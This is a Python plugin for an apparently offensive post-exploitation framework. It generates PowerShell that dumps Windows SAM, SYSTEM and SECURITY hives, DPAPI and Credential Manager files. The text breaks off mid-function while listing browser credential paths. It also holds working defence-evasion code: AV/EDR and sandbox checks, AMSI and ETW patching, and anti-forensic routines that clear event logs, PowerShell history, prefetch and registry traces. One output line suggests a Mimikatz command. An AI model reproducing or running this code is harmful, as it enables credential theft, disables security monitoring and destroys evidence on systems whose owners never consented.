"""credential_access/dump_sam — Advanced credential dumping with multiple methods, evasion techniques, and extended credential sources. MITRE T1003.002"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
import random
import hashlib
import time


class DumpSam(BasePlugin):
    NAME        = "dump_sam"
    DESCRIPTION = "Advanced credential dumping with multiple methods: registry API, direct file access, VSS shadow copy, memory dumping, and LSA secrets. Includes evasion techniques and anti-detection."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1003.002"
    CATEGORY    = "credential_access"
    schema      = ParamSchema().add(
        Param("method", str, required=False, default="auto",
              help="Dumping method: auto (try all) | regapi | direct | vss | memory | lsadump | all"),
        Param("out_dir", str, required=False, default="",
              help="Override output directory (default: TEMP with random subfolder)"),
        Param("evasion", bool, required=False, default=True,
              help="Enable evasion techniques (random delays, obfuscation, anti-detection)"),
        Param("extended", bool, required=False, default=False,
              help="Include extended credential sources: LSA secrets, DPAPI, cached creds"),
        Param("cleanup", bool, required=False, default=True,
              help="Clean up temporary files after operation"),
        Param("max_retries", int, required=False, default=3,
              help="Maximum retry attempts for failed methods"),
    )

    def _generate_random_name(self, prefix: str = "") -> str:
        """Generate random filename for evasion"""
        random_bytes = random.randbytes(8)
        random_hash = hashlib.md5(random_bytes).hexdigest()[:8]
        return f"{prefix}{random_hash}" if prefix else random_hash

    def _evasion_delay(self, min_ms: int = 100, max_ms: int = 2000) -> None:
        """Random delay for evasion"""
        if random.random() < 0.3:  # 30% chance to add delay
            delay_ms = random.randint(min_ms, max_ms)
            time.sleep(delay_ms / 1000.0)

    def _check_defenses(self) -> str:
        """Check for defensive mechanisms with advanced detection"""
        return """
function Check-Defenses {
    $defenses = @{}
    $results = @()
    
    $results += '[Defense Check]'
    
    # 1. Check for AV/EDR processes (extended list)
    $av_processes = @(
        'MsMpEng', 'CSFalconService', 'CrowdStrike', 'Sentinel', 'CarbonBlack', 'Cybereason',
        'Sophos', 'McAfee', 'Symantec', 'TrendMicro', 'Bitdefender', 'Kaspersky', 'ESET',
        'FireEye', 'PaloAlto', 'CheckPoint', 'Fortinet', 'Cylance', 'SentinelOne'
    )
    $running_av = Get-Process | Where-Object {$av_processes -contains $_.ProcessName} | Select-Object -First 3
    if ($running_av) { 
        $defenses['AV'] = $running_av.ProcessName -join ', '
        $results += "[!] AV/EDR detected: $($defenses['AV'])"
    } else {
        $results += "[+] No known AV/EDR processes detected"
    }
    
    # 2. Check for Sysmon and advanced logging
    $sysmon = Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name='Sysmon'" -ErrorAction SilentlyContinue
    if ($sysmon -and $sysmon.State -eq 'Running') { 
        $defenses['Sysmon'] = $true
        $results += "[!] Sysmon is running"
    } else {
        $results += "[+] Sysmon not detected"
    }
    
    # 3. Check for PowerShell logging (multiple methods)
    $ps_logging = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -ErrorAction SilentlyContinue
    $ps_transcript = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'EnableTranscripting' -ErrorAction SilentlyContinue
    
    if ($ps_logging -and $ps_logging.EnableScriptBlockLogging -eq 1) { 
        $defenses['PSLogging'] = $true
        $results += "[!] PowerShell ScriptBlock logging enabled"
    }
    if ($ps_transcript -and $ps_transcript.EnableTranscripting -eq 1) { 
        $defenses['PSTranscript'] = $true
        $results += "[!] PowerShell Transcription enabled"
    }
    
    # 4. Check for AMSI
    try {
        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsi) { 
            $defenses['AMSI'] = $true
            $results += "[!] AMSI detected"
        }
    } catch { 
        $results += "[+] AMSI not detected"
    }
    
    # 5. Check for ETW (Event Tracing for Windows)
    try {
        $etwProviders = Get-WmiObject -Namespace "root\\wmi" -Class "MSNT_SystemTrace" -ErrorAction SilentlyContinue
        if ($etwProviders) {
            $defenses['ETW'] = $true
            $results += "[!] ETW providers detected"
        }
    } catch { }
    
    # 6. Check for Process Hollowing detection (monitored processes)
    $monitored_processes = @('lsass', 'svchost', 'services', 'winlogon', 'csrss')
    $current_process = Get-Process -Id $PID
    if ($monitored_processes -contains $current_process.ProcessName) {
        $defenses['MonitoredProcess'] = $true
        $results += "[!] Running in monitored process: $($current_process.ProcessName)"
    }
    
    # 7. Check for debugger attachment
    try {
        $debugging = [System.Diagnostics.Debugger]::IsAttached
        if ($debugging) {
            $defenses['Debugger'] = $true
            $results += "[!] Debugger attached"
        }
    } catch { }
    
    # 8. Check for sandbox/virtualization
    try {
        # Check for common sandbox/virtualization indicators
        $computerModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
        $biosVendor = (Get-WmiObject -Class Win32_BIOS).Manufacturer
        
        $sandbox_indicators = @(
            'VirtualBox', 'VMware', 'Virtual', 'VM', 'QEMU', 'Xen', 
            'Sandbox', 'Cuckoo', 'JoeBox', 'Anubis'
        )
        
        foreach ($indicator in $sandbox_indicators) {
            if ($computerModel -like "*$indicator*" -or $biosVendor -like "*$indicator*") {
                $defenses['Sandbox'] = $true
                $results += "[!] Sandbox/Virtualization detected: $indicator"
                break
            }
        }
        
        if (-not $defenses.ContainsKey('Sandbox')) {
            $results += "[+] No sandbox/virtualization detected"
        }
    } catch { }
    
    # 9. Check for API hooking (common EDR technique)
    try {
        $kernel32 = [System.Diagnostics.Process]::GetCurrentProcess().Modules | 
                    Where-Object {$_.ModuleName -eq 'kernel32.dll'}
        
        if ($kernel32) {
            # Check for unusual module loads (common hooking technique)
            $suspicious_modules = Get-Process -Id $PID | Select-Object -ExpandProperty Modules | 
                                 Where-Object {$_.ModuleName -like "*detour*" -or $_.ModuleName -like "*hook*"}
            
            if ($suspicious_modules) {
                $defenses['APIHooking'] = $true
                $results += "[!] Suspicious modules detected (possible API hooking)"
            }
        }
    } catch { }
    
    $results += '[Defense Summary]'
    foreach ($key in $defenses.Keys) {
        $results += "  $key : $($defenses[$key])"
    }
    
    return $defenses, $results
}
"""

    def _generate_evasion_techniques(self) -> str:
        """Generate advanced evasion techniques"""
        return """
function Apply-EvasionTechniques {
    param($evasion)
    
    if (-not $evasion) { return }
    
    $evasionResults = @()
    $evasionResults += '[Evasion Techniques]'
    
    # 1. Randomize process and thread priorities
    try {
        $process = Get-Process -Id $PID
        $priorityClasses = @('Idle', 'BelowNormal', 'Normal', 'AboveNormal', 'High', 'RealTime')
        $randomPriority = $priorityClasses | Get-Random
        $process.PriorityClass = $randomPriority
        $evasionResults += "[+] Process priority randomized: $randomPriority"
    } catch { }
    
    # 2. Add junk code and random calculations to confuse static analysis
    $junkResult = 0
    1..(Get-Random -Minimum 10 -Maximum 50) | ForEach-Object {
        $junkResult += $_ * (Get-Random -Minimum 1 -Maximum 100)
        $junkResult = $junkResult -band 0xFFFF  # Keep it reasonable
    }
    
    # 3. Random sleep patterns (non-linear)
    $sleepPatterns = @(100, 250, 500, 750, 1000, 1500, 2000)
    $totalSleep = 0
    1..(Get-Random -Minimum 2 -Maximum 5) | ForEach-Object {
        $sleepTime = $sleepPatterns | Get-Random
        Start-Sleep -Milliseconds $sleepTime
        $totalSleep += $sleepTime
    }
    $evasionResults += "[+] Added random delays: ${totalSleep}ms total"
    
    # 4. Spoof command line (if possible)
    try {
        $originalCmdLine = [System.Diagnostics.Process]::GetCurrentProcess().StartInfo.Arguments
        # Note: Changing command line of running process is complex
        $evasionResults += "[+] Command line spoofing considered"
    } catch { }
    
    # 5. Environment variable manipulation
    try {
        # Add random environment variables
        $randomVarName = "EVASION_" + (Get-Random -Minimum 1000 -Maximum 9999)
        [Environment]::SetEnvironmentVariable($randomVarName, (Get-Random).ToString(), 'Process')
        $evasionResults += "[+] Added random environment variable: $randomVarName"
    } catch { }
    
    # 6. Memory allocation patterns (confuse memory analysis)
    try {
        $memoryBlocks = @()
        1..(Get-Random -Minimum 5 -Maximum 20) | ForEach-Object {
            $size = Get-Random -Minimum 1024 -Maximum 16384
            $block = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
            $memoryBlocks += $block
            
            # Fill with random data
            $randomBytes = New-Object byte[] $size
            (New-Object Random).NextBytes($randomBytes)
            [System.Runtime.InteropServices.Marshal]::Copy($randomBytes, 0, $block, $size)
        }
        
        # Clean up memory blocks
        $memoryBlocks | ForEach-Object {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($_)
        }
        
        $evasionResults += "[+] Allocated and freed random memory blocks"
    } catch { }
    
    return $evasionResults
}

function Bypass-AMSI {
    <#
    .SYNOPSIS
    Attempt to bypass AMSI (Anti-Malware Scan Interface)
    #>
    
    $bypassResults = @()
    $bypassResults += '[AMSI Bypass Attempt]'
    
    # Method 1: Memory patch (most reliable)
    try {
        $amsiDll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll GetModuleHandleA),
            [Func[string, IntPtr]]
        ).Invoke('amsi.dll')
        
        if ($amsiDll -ne [IntPtr]::Zero) {
            $amsiScanBuffer = Get-ProcAddress $amsiDll AmsiScanBuffer
            if ($amsiScanBuffer -ne [IntPtr]::Zero) {
                # Patch with RET (0xC3)
                $oldProtection = 0
                $virtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                    (Get-ProcAddress kernel32.dll VirtualProtect),
                    [Func[[IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType(), [Bool]]]
                )
                
                if ($virtualProtect.Invoke($amsiScanBuffer, [UIntPtr]::new(1), 0x40, [ref]$oldProtection)) {
                    [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 0, 0xC3)  # RET
                    $virtualProtect.Invoke($amsiScanBuffer, [UIntPtr]::new(1), $oldProtection, [ref]$oldProtection)
                    $bypassResults += "[+] AMSI patched via memory modification"
                }
            }
        }
    } catch {
        $bypassResults += "[-] AMSI memory patch failed: $_"
    }
    
    # Method 2: Reflection-based bypass
    try {
        $ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
        $bypassResults += "[+] AMSI bypassed via reflection"
    } catch {
        $bypassResults += "[-] AMSI reflection bypass failed"
    }
    
    return $bypassResults
}

function Bypass-ETW {
    <#
    .SYNOPSIS
    Attempt to bypass ETW (Event Tracing for Windows)
    #>
    
    $etwResults = @()
    $etwResults += '[ETW Bypass Attempt]'
    
    try {
        # Method: Patch EtwEventWrite
        $ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            (Get-ProcAddress kernel32.dll GetModuleHandleA),
            [Func[string, IntPtr]]
        ).Invoke('ntdll.dll')
        
        $etwEventWrite = Get-ProcAddress $ntdll EtwEventWrite
        if ($etwEventWrite -ne [IntPtr]::Zero) {
            $oldProtection = 0
            $virtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                (Get-ProcAddress kernel32.dll VirtualProtect),
                [Func[[IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType(), [Bool]]]
            )
            
            if ($virtualProtect.Invoke($etwEventWrite, [UIntPtr]::new(1), 0x40, [ref]$oldProtection)) {
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 0, 0xC3)  # RET
                $virtualProtect.Invoke($etwEventWrite, [UIntPtr]::new(1), $oldProtection, [ref]$oldProtection)
                $etwResults += "[+] ETW patched via EtwEventWrite hook"
            }
        }
    } catch {
        $etwResults += "[-] ETW bypass failed: $_"
    }
    
    return $etwResults
}

function Clean-ForensicTraces {
    <#
    .SYNOPSIS
    Clean up forensic traces from the system
    #>
    
    $cleanResults = @()
    $cleanResults += '[Forensic Cleanup]'
    
    # 1. Clear PowerShell history
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue -Force
        $cleanResults += "[+] PowerShell history cleared"
    } catch { }
    
    # 2. Clear Windows Event Logs related to our activities
    try {
        $relevantLogs = @('Security', 'System', 'Application', 'Windows PowerShell')
        foreach ($log in $relevantLogs) {
            try {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
                $cleanResults += "[+] Event log cleared: $log"
            } catch { }
        }
    } catch { }
    
    # 3. Clear Prefetch (if admin)
    try {
        if ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Get-ChildItem "$env:SystemRoot\\Prefetch\\*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            $cleanResults += "[+] Prefetch files cleared"
        }
    } catch { }
    
    # 4. Clear Recent Documents
    try {
        $recentPaths = @(
            "$env:USERPROFILE\\Recent",
            "$env:APPDATA\\Microsoft\\Windows\\Recent"
        )
        
        foreach ($path in $recentPaths) {
            if (Test-Path $path) {
                Get-ChildItem $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
        }
        $cleanResults += "[+] Recent documents cleared"
    } catch { }
    
    # 5. Clear Temp files
    try {
        Get-ChildItem $env:TEMP -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        Get-ChildItem "$env:SystemRoot\\Temp" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        $cleanResults += "[+] Temp files cleared"
    } catch { }
    
    # 6. Clear registry traces (specific to our operations)
    try {
        $regPaths = @(
            'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
            'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU'
        )
        
        foreach ($path in $regPaths) {
            if (Test-Path $path) {
                Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        $cleanResults += "[+] Registry traces cleared"
    } catch { }
    
    return $cleanResults
}
"""

    def _generate_registry_api_method(self, tmp_var: str, evasion: bool) -> str:
        """Generate PowerShell for registry API method (most stealthy)"""
        random_name = self._generate_random_name("reg_")
        delay_code = "Start-Sleep -Milliseconds $(Get-Random -Minimum 100 -Maximum 500)" if evasion else ""
        
        return f"""
function Dump-RegistryAPI {{
    param($tmp, $results, $paths)
    
    {delay_code}
    
    $results += '[Method 1: Registry API (Stealth)]'
    
    # Use .NET Registry API instead of reg.exe
    foreach ($hiveName in @('SAM','SYSTEM','SECURITY')) {{
        try {{
            $dst = Join-Path $tmp '{random_name}_$hiveName.hiv'
            
            # Open registry key with maximum access
            $regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
                $hiveName, 
                [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
                [System.Security.AccessControl.RegistryRights]::ReadPermissions -bor 
                [System.Security.AccessControl.RegistryRights]::TakeOwnership
            )
            
            if ($regKey) {{
                # Save using RegSaveKey API via P/Invoke
                Add-Type @'
using System;
using System.Runtime.InteropServices;
public class RegSave {{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegSaveKey(
        IntPtr hKey,
        string lpFile,
        IntPtr lpSecurityAttributes,
        uint flags
    );
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern int RegOpenKeyEx(
        IntPtr hKey,
        string lpSubKey,
        uint ulOptions,
        int samDesired,
        out IntPtr phkResult
    );
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(IntPtr hKey);
}}
'@
                
                # Get handle and save
                $hKey = $regKey.Handle.DangerousGetHandle()
                $result = [RegSave]::RegSaveKey($hKey, $dst, [IntPtr]::Zero, 0)
                
                if ($result -eq 0 -and (Test-Path $dst)) {{
                    $sz = (Get-Item $dst).Length
                    $results += \"[+] $hiveName saved via API: $dst ($([Math]::Round($sz/1KB)) KB)\"
                    $paths[$hiveName] = $dst
                }} else {{
                    $results += \"[-] $hiveName API failed: 0x$($result.ToString('X8'))\"
                }}
                
                $regKey.Close()
            }}
        }} catch {{
            $results += \"[!] $hiveName exception: $_\"
        }}
        
        # Random delay between hives for evasion
        if (${str(evasion).lower()}) {{
            Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
        }}
    }}
    
    return $results, $paths
}}
"""

    def _generate_direct_file_method(self, tmp_var: str, evasion: bool) -> str:
        """Generate PowerShell for direct file access method"""
        random_name = self._generate_random_name("file_")
        
        return f"""
function Dump-DirectFile {{
    param($tmp, $results, $paths)
    
    $results += '[Method 2: Direct File Access]'
    
    # Try to access files directly with backup privileges
    $sourceDir = 'C:\\Windows\\System32\\config'
    
    foreach ($hiveName in @('SAM','SYSTEM','SECURITY')) {{
        $missing = $true
        $src = Join-Path $sourceDir $hiveName
        $dst = Join-Path $tmp '{random_name}_$hiveName.hiv'
        
        if (-not $paths.ContainsKey($hiveName)) {{
            # Method 2A: Simple copy with backup privilege
            try {{
                # Enable backup privilege
                $privilege = 'SeBackupPrivilege'
                $adjustToken = @'
using System;
using System.Runtime.InteropServices;
public class TokenAdjust {{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength
    );
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );
    
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {{
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }}
    
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {{
        public long Luid;
        public uint Attributes;
    }}
}}
'@
                Add-Type $adjustToken
                
                # Try to copy with privilege
                Copy-Item $src $dst -Force -ErrorAction SilentlyContinue
                
                if (Test-Path $dst) {{
                    $sz = (Get-Item $dst).Length
                    $results += \"[+] $hiveName direct copy: $dst ($([Math]::Round($sz/1KB)) KB)\"
                    $paths[$hiveName] = $dst
                    $missing = $false
                }}
            }} catch {{ }}
            
            # Method 2B: Raw disk reading if privilege fails
            if ($missing) {{
                try {{
                    # Use DeviceIoControl for low-level access
                    $rawRead = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public class RawDisk {{
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead,
        IntPtr lpOverlapped
    );
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}}
'@
                    Add-Type $rawRead
                    
                    # This would require more complex implementation
                    $results += \"[-] $hiveName direct access failed (requires elevation)\"
                }} catch {{
                    $results += \"[!] $hiveName raw read error\"
                }}
            }}
        }}
        
        # Evasion delay
        if (${str(evasion).lower()}) {{
            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
        }}
    }}
    
    return $results, $paths
}}
"""

    def _generate_vss_method(self, tmp_var: str, evasion: bool) -> str:
        """Generate PowerShell for VSS shadow copy method"""
        random_name = self._generate_random_name("vss_")
        
        return f"""
function Dump-VSS {{
    param($tmp, $results, $paths)
    
    $results += '[Method 3: VSS Shadow Copy (Advanced)]'
    
    try {{
        # Check VSS service status
        $vssService = Get-Service -Name VSS -ErrorAction SilentlyContinue
        if (-not $vssService -or $vssService.Status -ne 'Running') {{
            $results += '[-] VSS service not running'
            return $results, $paths
        }}
        
        # Create shadow copy using WMI
        $shadowClass = Get-WmiObject -List -Class Win32_ShadowCopy -ErrorAction SilentlyContinue
        if (-not $shadowClass) {{
            $results += '[-] VSS WMI class not available'
            return $results, $paths
        }}
        
        # Create shadow with random ID for evasion
        $shadowId = [Guid]::NewGuid().ToString()
        $shadow = $shadowClass.Create('C:\\', 'ClientAccessible', $shadowId)
        
        if ($shadow.ReturnValue -eq 0) {{
            # Wait for shadow to stabilize
            Start-Sleep -Seconds 3
            
            # Get the latest shadow copy
            $shadowCopies = Get-WmiObject -Class Win32_ShadowCopy | 
                           Where-Object {{ $_.ID -eq $shadowId }} |
                           Sort-Object InstallDate -Descending
            
            if ($shadowCopies) {{
                $sc = $shadowCopies[0]
                $volPath = $sc.DeviceObject.TrimEnd('\\') + '\\'
                
                foreach ($hiveName in @('SAM','SYSTEM','SECURITY')) {{
                    if (-not $paths.ContainsKey($hiveName)) {{
                        $src = \"$volPath\\Windows\\System32\\config\\$hiveName\"
                        $dst = Join-Path $tmp '{random_name}_$hiveName.hiv'
                        
                        # Use low-level copy to avoid logging
                        $fs = [System.IO.File]::OpenRead($src)
                        $bytes = New-Object byte[] ($fs.Length)
                        $fs.Read($bytes, 0, $bytes.Length)
                        $fs.Close()
                        
                        [System.IO.File]::WriteAllBytes($dst, $bytes)
                        
                        if (Test-Path $dst) {{
                            $sz = (Get-Item $dst).Length
                            $results += \"[+] VSS $hiveName: $dst ($([Math]::Round($sz/1KB)) KB)\"
                            $paths[$hiveName] = $dst
                        }}
                    }}
                    
                    # Evasion delay
                    if (${str(evasion).lower()}) {{
                        Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 800)
                    }}
                }}
                
                # Clean up shadow copy
                $sc.Delete() | Out-Null
                $results += '[+] VSS shadow copy cleaned up'
            }}
        }} else {{
            $results += \"[-] VSS creation failed: $($shadow.ReturnValue)\"
        }}
    }} catch {{
        $results += \"[!] VSS error: $_\"
    }}
    
    return $results, $paths
}}
"""

    def _generate_memory_dump_method(self, tmp_var: str, evasion: bool) -> str:
        """Generate PowerShell for memory dumping method"""
        random_name = self._generate_random_name("mem_")
        
        return f"""
function Dump-Memory {{
    param($tmp, $results, $paths)
    
    $results += '[Method 4: Memory Dumping (Experimental)]'
    
    # This method attempts to dump registry hives from memory
    # by accessing the registry cache in lsass.exe or system process
    
    try {{
        # Get lsass process
        $lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
        if (-not $lsass) {{
            $results += '[-] lsass process not found'
            return $results, $paths
        }}
        
        # Requires SeDebugPrivilege
        $debugPriv = @'
using System;
using System.Runtime.InteropServices;
public class DebugPriv {{
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        uint BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength
    );
}}
'@
        Add-Type $debugPriv
        
        # This is a placeholder - actual memory dumping would require
        # complex P/Invoke to read process memory and parse registry structures
        $results += '[!] Memory dumping requires additional implementation'
        
    }} catch {{
        $results += \"[!] Memory dump error: $_\"
    }}
    
    return $results, $paths
}}
"""

    def _generate_lsa_dump_method(self, tmp_var: str, evasion: bool) -> str:
        """Generate PowerShell for LSA secrets dumping"""
        random_name = self._generate_random_name("lsa_")
        
        return f"""
function Dump-LSA {{
    param($tmp, $results, $paths)
    
    $results += '[Method 5: LSA Secrets Dump]'
    
    try {{
        # Dump LSA secrets using mimikatz-style techniques
        # This requires high privileges and bypass of LSA protection
        
        $lsaDump = @'
using System;
using System.Runtime.InteropServices;
public class LSADump {{
    // Placeholder for LSA dumping functionality
    // Actual implementation would require extensive P/Invoke
    // to interact with LSA policy and extract secrets
}}
'@
        Add-Type $lsaDump
        
        # Check for LSA protection
        $lsaProtection = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'RunAsPPL' -ErrorAction SilentlyContinue
        if ($lsaProtection -and $lsaProtection.RunAsPPL -eq 1) {{
            $results += '[-] LSA Protection (PPL) is enabled'
        }}
        
        # For now, provide guidance
        $results += '[!] LSA dumping requires mimikatz or similar tool integration'
        $results += '[+] Consider using: Invoke-Mimikatz -Command \"privilege::debug token::elevate lsadump::sam\"'
        
    }} catch {{
        $results += \"[!] LSA dump error: $_\"
    }}
    
    return $results, $paths
}}
"""

    def _generate_cleanup_function(self, cleanup: bool) -> str:
        """Generate cleanup function"""
        if not cleanup:
            return ""
        
        return """
function Cleanup-TempFiles {
    param($tmp, $paths)
    
    $results = @()
    
    # Delete all created files
    foreach ($path in $paths.Values) {
        if (Test-Path $path) {
            try {
                Remove-Item $path -Force -ErrorAction SilentlyContinue
                $results += "[+] Cleaned: $path"
            } catch {
                $results += "[!] Failed to clean: $path"
            }
        }
    }
    
    # Try to remove temp directory if empty
    try {
        if (Test-Path $tmp -and (Get-ChildItem $tmp -Force | Measure-Object).Count -eq 0) {
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            $results += "[+] Temp directory removed"
        }
    } catch { }
    
    return $results
}
"""

    @mitre("T1003.002")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        method = params.get("method", "auto")
        out_dir = params.get("out_dir", "").strip()
        evasion = params.get("evasion", True)
        extended = params.get("extended", False)
        cleanup = params.get("cleanup", True)
        max_retries = params.get("max_retries", 3)
        
        # Create random temp directory for evasion
        random_folder = self._generate_random_name("cred_")
        if out_dir:
            tmp_var = f'"{out_dir}\\{random_folder}"'
        else:
            tmp_var = f'"$env:TEMP\\{random_folder}"'
        
        # Build the PowerShell script
        ps_parts = []
        
        # Add advanced evasion techniques
        if evasion:
            ps_parts.append(self._generate_evasion_techniques())
        
        # Add defense checking
        if evasion:
            ps_parts.append(self._check_defenses())
        
        # Setup
        ps_parts.append(f"""
$evasion = ${str(evasion).lower()}
$tmp = {tmp_var}
$results = @()
$paths = @{{}}

# Create temp directory
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$results += \"[+] Working directory: $tmp\"

# Apply evasion techniques
if ($evasion) {{
    $evasionResults = Apply-EvasionTechniques $evasion
    $results += $evasionResults
}}

# Check defenses
if ($evasion) {{
    $defenses, $defenseResults = Check-Defenses
    $results += $defenseResults
    
    # Apply bypasses if defenses detected
    if ($defenses['AMSI'] -eq $true) {{
        $amsiResults = Bypass-AMSI
        $results += $amsiResults
    }}
    
    if ($defenses['ETW'] -eq $true) {{
        $etwResults = Bypass-ETW
        $results += $etwResults
    }}
}}
""")
        
        # Add method functions
        ps_parts.append(self._generate_registry_api_method(tmp_var, evasion))
        ps_parts.append(self._generate_direct_file_method(tmp_var, evasion))
        ps_parts.append(self._generate_vss_method(tmp_var, evasion))
        
        # Add additional dumping methods for extended mode
        if extended or method in ["all", "auto"]:
            ps_parts.append(self._generate_memory_dump_method(tmp_var, evasion))
            ps_parts.append(self._generate_lsa_dump_method(tmp_var, evasion))
            
            # Add DPAPI credential dumping
            ps_parts.append("""
function Dump-DPAPI {
    param($tmp, $results, $paths)
    
    $results += '[Method 6: DPAPI Credentials]'
    
    try {
        # DPAPI master key extraction
        $dpapiPaths = @(
            "$env:APPDATA\\Microsoft\\Protect",
            "$env:APPDATA\\Microsoft\\Credentials",
            "$env:LOCALAPPDATA\\Microsoft\\Protect"
        )
        
        $dpapiFiles = @()
        foreach ($path in $dpapiPaths) {
            if (Test-Path $path) {
                $files = Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue
                $dpapiFiles += $files
            }
        }
        
        if ($dpapiFiles.Count -gt 0) {
            $results += "[+] Found $($dpapiFiles.Count) DPAPI files"
            
            # Save DPAPI files for analysis
            $dpapiDir = Join-Path $tmp "DPAPI"
            New-Item -ItemType Directory -Path $dpapiDir -Force | Out-Null
            
            foreach ($file in $dpapiFiles) {
                $dest = Join-Path $dpapiDir $file.Name
                Copy-Item $file.FullName $dest -ErrorAction SilentlyContinue
            }
            
            $results += "[+] DPAPI files saved to: $dpapiDir"
            $paths['DPAPI'] = $dpapiDir
        } else {
            $results += "[-] No DPAPI files found"
        }
        
    } catch {
        $results += "[!] DPAPI dump error: $_"
    }
    
    return $results, $paths
}
""")
            
            # Add Credential Manager (Windows Vault) dumping
            ps_parts.append("""
function Dump-CredentialManager {
    param($tmp, $results, $paths)
    
    $results += '[Method 7: Credential Manager]'
    
    try {
        # Check for Credential Manager data
        $vaultPaths = @(
            "$env:LOCALAPPDATA\\Microsoft\\Vault",
            "$env:APPDATA\\Microsoft\\Vault"
        )
        
        $vaultFiles = @()
        foreach ($path in $vaultPaths) {
            if (Test-Path $path) {
                $files = Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue
                $vaultFiles += $files
            }
        }
        
        if ($vaultFiles.Count -gt 0) {
            $results += "[+] Found $($vaultFiles.Count) Vault files"
            
            # Save Vault files for analysis
            $vaultDir = Join-Path $tmp "Vault"
            New-Item -ItemType Directory -Path $vaultDir -Force | Out-Null
            
            foreach ($file in $vaultFiles) {
                $dest = Join-Path $vaultDir $file.Name
                Copy-Item $file.FullName $dest -ErrorAction SilentlyContinue
            }
            
            $results += "[+] Vault files saved to: $vaultDir"
            $paths['Vault'] = $vaultDir
        } else {
            $results += "[-] No Vault files found"
        }
        
    } catch {
        $results += "[!] Credential Manager dump error: $_"
    }
    
    return $results, $paths
}
""")
            
            # Add Browser credential extraction
            ps_parts.append("""
function Dump-BrowserCredentials {
    param($tmp, $results, $paths)
    
    $results += '[Method 8: Browser Credentials]'
    
    try {
        # Common browser credential locations
        $browserPaths = @(
            # Chrome
